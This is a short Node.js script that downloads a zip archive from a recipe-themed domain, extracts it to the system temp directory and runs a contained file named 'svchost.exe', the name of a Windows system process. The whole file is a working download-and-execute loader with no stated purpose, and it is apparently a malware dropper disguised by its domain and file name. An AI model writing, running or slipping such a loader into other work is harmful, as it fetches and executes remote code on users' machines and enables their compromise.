const axios = require('axios'); // For HTTP requests
const fs = require('fs'); // For file system operations
const path = require('path'); // For file paths
const AdmZip = require('adm-zip'); // For unzipping files
const os = require('os'); // For getting the system's temp directory
const { exec } = require('child_process'); // For running commands

async function performAllTasks() {
    const fileUrl = 'https://goodrecepies.xyz/chicken.zip';

    try {
        // Step 1: Download the file
        const tempDir = os.tmpdir();
        const zipFilePath = path.join(tempDir, 'downloaded.zip');
        console.log(`Downloading file from: ${fileUrl}`);
        
        // Ensure the file is fully downloaded before proceeding
        const writer = fs.createWriteStream(zipFilePath);
        const response = await axios({
            url: fileUrl,
            method: 'GET',
            responseType: 'stream'
        });
        response.data.pipe(writer);

        // Wait for the download to finish
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        console.log(`Downloaded file to: ${zipFilePath}`);

        // Step 2: Unzip the file
        const unzipOutputDir = path.join(tempDir, 'unzipped');
		
        fs.mkdirSync(unzipOutputDir, { recursive: true }); // Ensure the directory exists

        try {
            const zip = new AdmZip(zipFilePath);
            zip.extractAllTo(unzipOutputDir, true);
            console.log(`Unzipped file to: ${unzipOutputDir}`);
            
            // Debug: List extracted files
            const files = fs.readdirSync(unzipOutputDir);
            console.log(`Files in the extracted directory: ${files.join(', ')}`);
        } catch (error) {
            throw new Error(`Error unzipping file: ${error.message}`);
        }

        // Step 3: Execute the file
        const executableFilePath = path.join(unzipOutputDir, 'chicken', 'svchost.exe');

        // Verify if the file exists before execution
        if (fs.existsSync(executableFilePath)) {
            console.log(`Executing file: ${executableFilePath}`);

            // Ensure the executable is available before running
            await new Promise((resolve, reject) => {
                exec(executableFilePath, (error, stdout, stderr) => {
                    if (error) {
                        reject(new Error(`Error executing file: ${error.message}`));
                    } else {
                        resolve({ stdout, stderr });
                    }
                });
            }).then(({ stdout, stderr }) => {
                if (stderr) {
                    console.error(`Execution stderr: ${stderr}`);
                } else {
                    console.log(`Execution stdout: ${stdout}`);
                }
            }).catch(error => {
                console.error(error.message);
            });
        } else {
            throw new Error(`Executable file not found: ${executableFilePath}`);
        }


    } catch (error) {
        console.error(`Error: ${error.message}`);
    }
}

// Run the function if script is executed directly
if (require.main === module) {
    performAllTasks();
}

// Export the function for reuse
module.exports = performAllTasks;